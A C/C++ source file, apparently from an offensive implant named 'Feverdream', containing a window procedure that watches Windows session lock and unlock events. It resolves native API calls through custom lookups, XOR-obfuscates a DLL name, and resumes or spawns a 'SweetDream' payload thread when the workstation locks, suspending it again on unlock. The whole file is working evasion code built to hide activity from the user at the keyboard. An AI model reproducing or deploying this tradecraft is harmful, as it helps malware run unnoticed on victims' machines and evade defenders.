#include "../include/Feverdream.h"

typedef struct _EnumThreadsAPI {
	NtClose_t NtClose;
	NtQueryInformationThread_t NtQueryInformationThread;
	NtOpenThread_t NtOpenThread;
} EnumThreadsAPI;

D_SEC( B ) DWORD _sdEnumerateThreads(ULONG ulCounter, SYSTEM_PROCESS_INFORMATION* ProcessInfo, SYSTEM_THREAD_INFORMATION* LatestThread, PBYTE StartMod, PBYTE EndMod, EnumThreadsAPI* api) {
	HANDLE hThread = NULL;
	SYSTEM_THREAD_INFORMATION* thread = nullptr;
	PVOID pStartAddr = nullptr;
	NTSTATUS status = NULL;
	CLIENT_ID cid = {};
	OBJECT_ATTRIBUTES oa{};
	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
	
	if (ulCounter == ProcessInfo->NumberOfThreads) {
		return (DWORD)(ULONG_PTR)LatestThread->ClientId.UniqueThread;
	}
	thread = &ProcessInfo->Threads[ulCounter];
	cid.UniqueThread = thread->ClientId.UniqueThread;

	status = api->NtOpenThread(&hThread, THREAD_QUERY_INFORMATION, &oa, &cid);
	if (status != STATUS_SUCCESS) {
		return _sdEnumerateThreads(ulCounter + 1, ProcessInfo, LatestThread, StartMod, EndMod, api);
	}

	status = api->NtQueryInformationThread(hThread, (THREADINFOCLASS)ThreadQuerySetWin32StartAddress, &pStartAddr, sizeof(pStartAddr), 0);
	if (status != STATUS_SUCCESS) {
		return 1;
	}

	status = api->NtClose(hThread);
	if (status != STATUS_SUCCESS) {
		return 1;
	}

	if ((PBYTE)pStartAddr >= StartMod && (PBYTE)pStartAddr <= EndMod) {
		return _sdEnumerateThreads(ulCounter + 1, ProcessInfo, thread, StartMod, EndMod, api);
	}

	return _sdEnumerateThreads(ulCounter + 1, ProcessInfo, LatestThread, StartMod, EndMod, api);
}

D_SEC( B ) DWORD sdEnumerateThreads(SYSTEM_PROCESS_INFORMATION* ProcessInfo, PBYTE StartMod, PBYTE EndMod) {
	EnumThreadsAPI api{};
	PVOID hNtDll = sdGetModuleHandle(NTDLL);
	api.NtClose = (NtClose_t)sdGetProcAddress(hNtDll, NT_CLOSE);
	api.NtQueryInformationThread = (NtQueryInformationThread_t)sdGetProcAddress(hNtDll, NT_QUERY_INFO_THREAD);
	api.NtOpenThread = (NtOpenThread_t)sdGetProcAddress(hNtDll, NT_OPEN_THREAD);
	return _sdEnumerateThreads(0, ProcessInfo, nullptr, StartMod, EndMod, &api);
}

D_SEC( B ) SYSTEM_PROCESS_INFORMATION* sdEnumerateProcesses(SYSTEM_PROCESS_INFORMATION* ProcessInfo) {
	if ((DWORD)(ULONG_PTR)ProcessInfo->UniqueProcessId == CurrentPID) {
		return ProcessInfo;
	}
	if (ProcessInfo->NextEntryOffset == 0) {
		return nullptr;
	}
	ProcessInfo = (SYSTEM_PROCESS_INFORMATION*)((PBYTE)ProcessInfo + ProcessInfo->NextEntryOffset);
	return sdEnumerateProcesses(ProcessInfo);
}

D_SEC( B ) DWORD GetLastTID(VOID) {
	PVOID hNtDll = sdGetModuleHandle(NTDLL);
	NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)sdGetProcAddress(hNtDll, NT_QUERY_SYSTEM_INFO);
	NtQueryInformationThread_t NtQueryInformationThread = (NtQueryInformationThread_t)sdGetProcAddress(hNtDll, NT_QUERY_INFO_THREAD);
	NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)sdGetProcAddress(hNtDll, NT_VIRTUAL_ALLOC);
	NtFreeVirtualMemory_t NtFreeVirtualMemory = (NtFreeVirtualMemory_t)sdGetProcAddress(hNtDll, NT_FREE_VIRTUAL_MEM);

	ULONG ulLen = 0;
	SIZE_T Size = 0;
	PVOID pBuffer = nullptr;
	NTSTATUS status = NULL;
	SYSTEM_PROCESS_INFORMATION* spi = nullptr;
	SYSTEM_THREAD_INFORMATION* newestThread = nullptr;
	PPEB peb = nullptr;
	PPEB_LDR_DATA ldr = nullptr;
	PLIST_ENTRY list = nullptr;
	PLDR_DATA_TABLE_ENTRY entry = nullptr;
	PIMAGE_DOS_HEADER dos = nullptr;
	PIMAGE_NT_HEADERS nt = nullptr;
	PBYTE pbModuleEnd = nullptr;
	DWORD tid = 0;

	status = NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &ulLen);
	if (status != STATUS_SUCCESS) {
		return 1;
	}

	status = NtAllocateVirtualMemory(((HANDLE)-1), &pBuffer, 0, (PSIZE_T)&ulLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != STATUS_SUCCESS) {
		return 1;
	}

	NtQuerySystemInformation(SystemProcessInformation, pBuffer, ulLen, &ulLen);
	if (status != STATUS_SUCCESS) {
		return 1;
	}
	
	spi = (SYSTEM_PROCESS_INFORMATION*)pBuffer;
	newestThread = NULL;
	peb = GetPEB;
	ldr = (PPEB_LDR_DATA)peb->Ldr;
	list = (PLIST_ENTRY)&ldr->InLoadOrderModuleList;
	entry = (PLDR_DATA_TABLE_ENTRY)list->Flink;
	dos = (PIMAGE_DOS_HEADER)entry->DllBase;
	nt = (PIMAGE_NT_HEADERS)((DWORD_PTR)entry->DllBase + dos->e_lfanew);

	pbModuleEnd = (PBYTE)entry->DllBase + nt->OptionalHeader.SizeOfImage;

	spi = sdEnumerateProcesses(spi);
	if (spi == nullptr) {
		return 1;
	}

	tid = sdEnumerateThreads(spi, (PBYTE)entry->DllBase, (PBYTE)pbModuleEnd);
	if (tid == 1) {
		return 1;
	}
	
	status = NtFreeVirtualMemory(((HANDLE)-1), &pBuffer, &Size, MEM_RELEASE);
	if (status != STATUS_SUCCESS) {
		return 1;
	}

	return tid;
}

D_SEC( B ) LRESULT CALLBACK WindowMessageReceiveRoutine(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam) {
	PVOID hNtDll = sdGetModuleHandle(NTDLL);
	PVOID hUser32Dll = sdGetModuleHandle(USER32);
	PostMessageW_t PostMsgW = (PostMessageW_t)sdGetProcAddress(hUser32Dll, U_POST_MESSAGE_W);
	NTSTATUS status = NULL;
	switch (Msg) {
	case WM_CREATE: {
		BYTE Buff[] = { 0x17, 0x34, 0x32, 0x22, 0x30, 0x2D, 0x72, 0x75, 0x6E, 0x2C, 0x2D, 0x27 };
		WCHAR wcDecrypted[12] = {};
		UNICODE_STRING ustrDll = {};
		LdrLoadDll_t LdrLoadDll = (LdrLoadDll_t)sdGetProcAddress(hNtDll, LDR_LOAD_DLL);
		PVOID hWtsapi = nullptr;

		Xor((PCHAR)&Buff, 12);
		sdByteArrayToCharArrayW((PWCHAR)&wcDecrypted, (PBYTE)&Buff, 8);
		sdRtlInitUnicodeString(&ustrDll, wcDecrypted);

		status = LdrLoadDll(0, 0, &ustrDll, &hWtsapi);
		if (status != STATUS_SUCCESS && status != STATUS_IMAGE_ALREADY_LOADED) {
			PostMsgW(hWnd, WM_DESTROY, 0, 0);
		}

		WTSRegisterSessionNotification_t WTSRegisterSessionNotification = (WTSRegisterSessionNotification_t)sdGetProcAddress(hWtsapi, WTS_REGISTER_SESSION_NOTIFICATION);
		if (!WTSRegisterSessionNotification(hWnd, NOTIFY_FOR_THIS_SESSION)) {
			PostMsgW(hWnd, WM_DESTROY, 0, 0);
		}
		break;
	}
	case WM_WTSSESSION_CHANGE: {
		DWORD ThreadState = 0;
		switch (wParam) {
		case WTS_SESSION_LOCK: {
			DWORD tid = GetLastTID();
			HANDLE hLatestThread = NULL;
			CLIENT_ID cid{};
			OBJECT_ATTRIBUTES oa{};
			NtOpenThread_t NtOpenThread = (NtOpenThread_t)sdGetProcAddress(hNtDll, NT_OPEN_THREAD);
			NtQueryInformationThread_t NtQueryInformationThread = (NtQueryInformationThread_t)sdGetProcAddress(hNtDll, NT_QUERY_INFO_THREAD);
			NtResumeThread_t NtResumeThread = (NtResumeThread_t)sdGetProcAddress(hNtDll, NT_RESUME_THREAD);
			THREAD_BASIC_INFORMATION tbi = {};
			ULONG ulRetLen = 0;

			InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
			cid.UniqueThread = (HANDLE)(ULONG_PTR)tid;

			status = NtOpenThread(&hLatestThread, THREAD_ALL_ACCESS, &oa, &cid);
			if (status != STATUS_SUCCESS) {
				PostMsgW(hWnd, WM_DESTROY, 0, 0);
			}

			status = NtQueryInformationThread(hLatestThread, ThreadBasicInformation, &tbi, sizeof(tbi), &ulRetLen);
			if (status != STATUS_SUCCESS) {
				PostMsgW(hWnd, WM_DESTROY, 0, 0);
			}

			if ((DWORD)tbi.ExitStatus == STILL_ACTIVE && CurrentTID != tid) {
				ULONG previousSuspendCount = 0;
				status = NtResumeThread(hLatestThread, &previousSuspendCount);
				if (status != STATUS_SUCCESS) {
					PostMsgW(hWnd, WM_DESTROY, 0, 0);
				}
			}
			else {
				HANDLE hThread = NULL;
				NtCreateThreadEx_t NtCreateThreadEx = (NtCreateThreadEx_t)sdGetProcAddress(hNtDll, NT_CREATE_THREAD_EX);
				status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, ((HANDLE)-1), (PUSER_THREAD_START_ROUTINE)G_SYM( SweetDream ), (PVOID)hWnd, FALSE, 0, 0, 0, NULL);
				if (status != STATUS_SUCCESS) {
					PostMsgW(hWnd, WM_DESTROY, 0, 0);
				}
			}
			break;
		}
		case WTS_SESSION_UNLOCK: {
			DWORD tid = GetLastTID();
			HANDLE hLatestThread = 0;
			OBJECT_ATTRIBUTES oa = {};
			CLIENT_ID cid = {};
			THREAD_BASIC_INFORMATION tbi = {};
			ULONG ulRetLen = 0;
			NtSuspendThread_t NtSuspendThread = (NtSuspendThread_t)sdGetProcAddress(hNtDll, NT_SUSPEND_THREAD);
			NtOpenThread_t NtOpenThread = (NtOpenThread_t)sdGetProcAddress(hNtDll, NT_OPEN_THREAD);
			NtQueryInformationThread_t NtQueryInformationThread = (NtQueryInformationThread_t)sdGetProcAddress(hNtDll, NT_QUERY_INFO_THREAD);

			InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
			cid.UniqueThread = (HANDLE)(ULONG_PTR)tid;

			status = NtOpenThread(&hLatestThread, THREAD_ALL_ACCESS, &oa, &cid);
			if (status != STATUS_SUCCESS) {
				PostMsgW(hWnd, WM_DESTROY, 0, 0);
			}

			status = NtQueryInformationThread(hLatestThread, ThreadBasicInformation, &tbi, sizeof(tbi), &ulRetLen);
			if (status != STATUS_SUCCESS) {
				PostMsgW(hWnd, WM_DESTROY, 0, 0);
			}

			if ((DWORD)tbi.ExitStatus == STILL_ACTIVE && CurrentTID != tid) {
				ULONG previousSuspendCount = 0;
				status = NtSuspendThread(hLatestThread, &previousSuspendCount);
				if (status != STATUS_SUCCESS) {
					PostMsgW(hWnd, WM_DESTROY, 0, 0);
				}
			}
			break;
		}
		default: {
			break;
		}
		}
		break;
	}
	case WM_DESTROY: {
		NtOpenThread_t NtOpenThread = (NtOpenThread_t)sdGetProcAddress(hNtDll, NT_OPEN_THREAD);
		NtTerminateThread_t NtTerminateThread = (NtTerminateThread_t)sdGetProcAddress(hNtDll, NT_TERMINATE_THREAD);
		CLIENT_ID cid{};
		OBJECT_ATTRIBUTES oa{};
		InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
		PVOID hWtsapi = sdGetModuleHandle(WTSAPI32);

		WTSUnRegisterSessionNotification_t WTSUnRegisterSessionNotification = (WTSUnRegisterSessionNotification_t)sdGetProcAddress(hWtsapi, WTS_UNREGISTER_SESSION_NOTIFICATION);
		if (!WTSUnRegisterSessionNotification(hWnd)) {
			return 1;
		}
		DWORD tid = GetLastTID();
		if (tid != CurrentTID) {
			cid.UniqueThread = (HANDLE)(ULONG_PTR)tid;
			HANDLE hLatestThread = NULL;
			status = NtOpenThread(&hLatestThread, THREAD_ALL_ACCESS, &oa, &cid);
			if (status != STATUS_SUCCESS) {
				return 1;
			}
			status = NtTerminateThread(hLatestThread, STATUS_SUCCESS);
			if (status != STATUS_SUCCESS) {
				return 1;
			}
		}
		break;
	}
	default: {
		DefWindowProcW_t NtDefWindowProc = (DefWindowProcW_t)sdGetProcAddress(hNtDll, NT_DEF_WINDOW_PROC);
		return NtDefWindowProc(hWnd, Msg, wParam, lParam);
	}
	}
	return ERROR_SUCCESS;
}
